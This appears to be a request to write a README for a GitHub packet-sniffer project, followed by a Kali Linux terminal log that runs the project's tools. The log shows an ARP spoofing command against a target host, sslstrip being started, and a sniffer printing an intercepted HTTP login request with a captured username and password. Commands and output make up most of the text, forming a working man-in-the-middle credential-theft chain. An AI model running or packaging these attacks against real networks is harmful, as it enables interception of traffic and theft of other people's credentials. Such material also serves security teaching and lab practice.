https://github.com/arifbinekram/Packet-Sniffer
write me a read me file for this project :
(root㉿kali)-[~]
└─# git clone https://github.com/arifbinekram/Packet-Sniffer.git
Cloning into 'Packet-Sniffer'...
remote: Enumerating objects: 6, done.
remote: Counting objects: 100% (6/6), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 6 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (6/6), done.
                                                                             
┌──(root㉿kali)-[~]
└─# cd Packet-Sniffer/arp\ spoofer 
                                                                             
┌──(root㉿kali)-[~/Packet-Sniffer/arp spoofer]
└─# python arp_spoof.py -t 10.0.2.4 -s 10.0.2.1

(root㉿kali)-[~]
└─# sslstrip

sslstrip 1.0 by Moxie Marlinspike running...

──(root㉿kali)-[~]
└─# cd Packet-Sniffer/packet\ sniffer 
                                                                             
┌──(root㉿kali)-[~/Packet-Sniffer/packet sniffer]
└─# python packet_sniffer.py 
[+] HTTP Request > www.sxtmgc.com/admin/loginvalidate.php


[+] Possible username and password: username=packetsniffer%40gmail.com&password=wefergrhsdffr&submit=

